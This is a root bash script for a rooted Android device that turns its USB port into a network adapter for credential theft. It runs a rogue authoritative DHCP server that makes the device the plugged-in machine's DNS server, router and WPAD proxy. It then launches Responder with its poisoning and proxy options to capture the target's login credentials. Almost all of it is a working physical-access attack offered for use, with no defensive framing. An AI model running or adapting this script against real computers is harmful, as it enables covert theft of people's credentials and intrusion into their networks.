#!/bin/bash
#
# TODO: Add checks for packages
#
# apt-get install -y python git python-pip python-dev screen sqlite3
# pip install pycrypto
# cd /root
# git clone https://github.com/spiderlabs/responder
#

#
# TODO: Add check for RNDIS interface
#
echo "Bringing down USB"
# We have to disable the usb interface before reconfiguring it
echo 0 > /sys/devices/virtual/android_usb/android0/enable
echo rndis > /sys/devices/virtual/android_usb/android0/functions
echo 224 > /sys/devices/virtual/android_usb/android0/bDeviceClass
echo 6863 > /sys/devices/virtual/android_usb/android0/idProduct
echo 1 > /sys/devices/virtual/android_usb/android0/enable

echo "Check for changes"
# Check whether it has applied the changes
cat /sys/devices/virtual/android_usb/android0/functions
cat /sys/devices/virtual/android_usb/android0/enable

echo "rndis0 interface:"
ifconfig rndis0

echo "Setting IP for rndis0"
ip addr flush dev rndis0
# - Use linklocal/26, so if target comes up in a weird state
#   and attempts linklocal.. we can talk back ;)
#ip addr add 10.0.0.201/24 dev rndis0
ip addr add 169.254.1.201/16 dev rndis0
ip link set rndis0 up

echo "Creating DHCP.conf"
cat << EOF > /root/mubix-dhcpd.conf

option domain-name "domain.local";
option domain-name-servers 169.254.1.201;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 169.254.0.0 netmask 255.255.0.0 {
  range 169.254.10.0 169.254.10.100;
  option routers 169.254.1.201;
  option local-proxy-config "http://169.254.1.201/wpad.dat";
}
EOF

echo "Remove previous dhcpd leases"
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

echo "Starting DHCPD server"
/usr/sbin/dhcpd -cf /root/mubix-dhcpd.conf

echo "Creating SCREEN logger"
cat << EOF > /root/.screenrc
# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
EOF
mkdir -p /root/logs

echo "Starting Responder"
/usr/bin/screen -dmS responder bash -c 'cd /root/Responder/; python Responder.py -I rndis0 -v -f -w -r -d -F'

# TODO: Kill Responder, bring rndis0 down
killall dhcpd

